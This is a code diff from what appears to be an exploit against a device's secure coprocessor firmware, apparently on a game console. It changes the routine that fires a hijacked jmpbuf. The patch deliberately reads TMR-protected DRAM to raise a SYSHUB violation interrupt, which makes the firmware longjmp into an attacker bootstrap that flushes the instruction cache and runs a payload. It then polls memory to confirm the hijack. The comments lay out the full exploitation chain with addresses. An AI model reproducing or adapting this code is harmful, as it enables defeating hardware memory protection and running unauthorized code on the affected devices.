@@ -238,21 +238,29 @@ int prosperous_run(void)
 
     /* Wait for bootstrap to fire via jmpbuf hijack.
      *
-     * The jmpbuf trigger is armed: qword_123180 != 0. The next A53 exception
-     * (any IRQ, SError, etc.) will:
-     *   1. Exception handler sees qword_123180 != 0
-     *   2. Calls sub_107BE0 (longjmp) → RETs to bootstrap at 0x883F0000
-     *   3. Bootstrap does IC IALLU (flushes all I-cache)
-     *   4. Bootstrap clears qword_123180 (one-shot)
-     *   5. Bootstrap ERETs to 0x108BF4 (safe IRQ handler loop)
-     *   6. Next IRQ: BL at 0x108BD4 now fetches patched instruction from DRAM
-     *      → calls thunk at 0x1E0000 → thunk calls payload at 0x883F1000
+     * The jmpbuf trigger is armed: qword_123180 != 0. However, the firmware
+     * only checks qword_123180 during the SYSHUB Violation handler (GIC IRQ 33),
+     * NOT during normal timer interrupts. We must deliberately trigger a SYSHUB
+     * violation by doing an x86 read of TMR-protected MP4 DRAM.
      *
-     * We poll qword_123180 via DECI5S to confirm bootstrap ran.
+     * Access path: x86 → DMAP → PA 0x60000000 → SB → TMR check → BLOCKED
+     *   → SYSHUB violation interrupt (IRQ 33) → A53 exception handler
+     *   → checks qword_123180 != 0 → longjmp → bootstrap → IC IALLU
+     *
+     * TMR 20 is still active at this point, so the read will be blocked
+     * (returns garbage) but the violation interrupt fires on the A53.
      */
-    printf("[*] Waiting for I-cache flush bootstrap...\n");
-    for (int i = 0; i < 20; i++) {
-        usleep(250000); /* 250ms per check */
+    printf("[*] Triggering SYSHUB violation to fire jmpbuf bootstrap...\n");
+    for (int attempt = 0; attempt < 5; attempt++) {
+        /* Read TMR-protected MP4 DRAM to trigger SYSHUB violation (IRQ 33) */
+        volatile uint32_t *mp4_dram = (volatile uint32_t *)(
+            (intptr_t)(ctx.dmap_base + MP4_DRAM_BASE));
+        uint32_t dummy = *mp4_dram;  /* TMR blocks this → SYSHUB violation */
+        (void)dummy;
+        printf("[DIAG] SYSHUB trigger read: 0x%08x (blocked by TMR, expected)\n", dummy);
+
+        usleep(500000); /* 500ms for A53 to process the violation */
+
         uint64_t jmpbuf_check = 0xDEAD;
         deci5s_read_mem(A53_DRAM_PA_BASE + A53_JMPBUF_PTR_OFF, &jmpbuf_check, 8);
         printf("[DIAG] qword_123180 = 0x%llx %s\n",
@@ -262,6 +270,7 @@ int prosperous_run(void)
             printf("[+] Bootstrap IC IALLU confirmed — I-cache flushed!\n");
             break;
         }
+        printf("[*] Retrying SYSHUB trigger (attempt %d/5)...\n", attempt + 1);
     }
 
     /* Brief additional wait for thunk to become active after I-cache flush */
